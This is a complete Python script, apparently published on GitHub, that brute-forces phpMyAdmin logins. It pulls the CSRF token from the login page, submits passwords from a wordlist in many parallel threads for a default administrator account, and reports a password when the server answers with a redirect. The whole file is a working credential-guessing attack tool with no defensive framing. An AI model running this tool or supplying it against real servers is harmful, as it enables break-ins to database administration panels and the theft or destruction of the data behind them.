import requests
from bs4 import BeautifulSoup
import sys
import re
import threading
import queue
import time
import argparse
import os

parser = argparse.ArgumentParser(description="\nhttps://github.com/btwnglxs/PhpMyAdmin-csrf-login-brute\n")
parser.add_argument("-u", "--url", required=True, help="URL to phpMyAdmin admin panel")
parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist to use")
parser.add_argument("-n", "--username", default="administrator", help="Username (default: administrator)")
parser.add_argument("-t", "--threads", type=int, default=20, help="Threads count (default: 20)")

args = parser.parse_args()

url = args.url
wordlist_path = args.wordlist
username = args.username
num_threads = args.threads

print("  [i] Counting passwords count in wordlist...")
try:
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        lines = sum(1 for line in f if line.strip())
except FileNotFoundError:
    print(f"  [!] Error: File '{wordlist_path}' is not found.")
    sys.exit(1)

current = 0
found = False

password_queue = queue.Queue(maxsize=10000)
lock = threading.Lock()

def parse_token_from_html(html_text):
    # func to search CSRF-token
    soup = BeautifulSoup(html_text, "html.parser")
    token_elements = soup.find_all("input", attrs={"name": "token"})
    
    if token_elements:
        return token_elements[-1]["value"]
    
    token_match = re.search(r'name=["\']token["\']\s+value=["\']([a-f0-9]{32})["\']|value=["\']([a-f0-9]{32})["\']\s+name=["\']token["\']', html_text)
    if token_match:
        return token_match.group(1) if token_match.group(1) else token_match.group(2)
    return None

def get_csrf_token(session):
    # func to obtain CSRF-token
    try:
        response = session.get(url, timeout=5)
        if response.status_code == 200:
            return parse_token_from_html(response.text)
    except Exception:
        pass
    return None

def worker():
    global current, found
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Accept-Language": "en-US,en;q=0.9"
    })

    token = None

    while not found:
        password = password_queue.get()
        
        if password is None:
            password_queue.task_done()
            break

        if not token:
            token = get_csrf_token(session)
            if not token:
                password_queue.task_done()
                time.sleep(1)
                continue

        data = {
            "pma_username": username,
            "pma_password": password,
            "server": "1",
            "target": "index.php",
            "lang": "en",
            "token": token
        }

        try:
            res = session.post(url, data=data, allow_redirects=False, timeout=5)
            
            if res.status_code == 302:
                with lock:
                    if not found:
                        found = True
                        print(f"\n\n  [+] Password is found: {password}")
                        os._exit(0) 
            elif res.status_code in [501, 502, 503]:
                with lock:
                    print(f"\n  [!] Error: Server returned {res.status_code} statuscode. Session reinitialization...")
                token = None  
            else:
                new_token = parse_token_from_html(res.text)
                if new_token:
                    token = new_token
                else:
                    token = None 
                
                with lock:
                    current += 1
                    print(f" Checking: {password:<20} | {current} из {lines}", end="\r")
                
        except Exception:
            token = None  
            
        password_queue.task_done()

print(f"  [i] Target: {url}")
print(f"  [i] Username: {username}")
print(f"  [i] Threads: {num_threads}")
print("  [i] Launching...")

threads = []
for i in range(num_threads):
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    threads.append(t)
    time.sleep(0.01)

try:
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if found:
                break
            pwd = line.strip()
            if pwd:
                password_queue.put(pwd)
    
    # Stopping threads
    for _ in range(num_threads):
        password_queue.put(None)

    password_queue.join()

except KeyboardInterrupt:
    print("\n  [!] Bruteforce is interrupted.")
    sys.exit(0)

if not found:
    print("\n  [!] The wordlist is exhausted.")

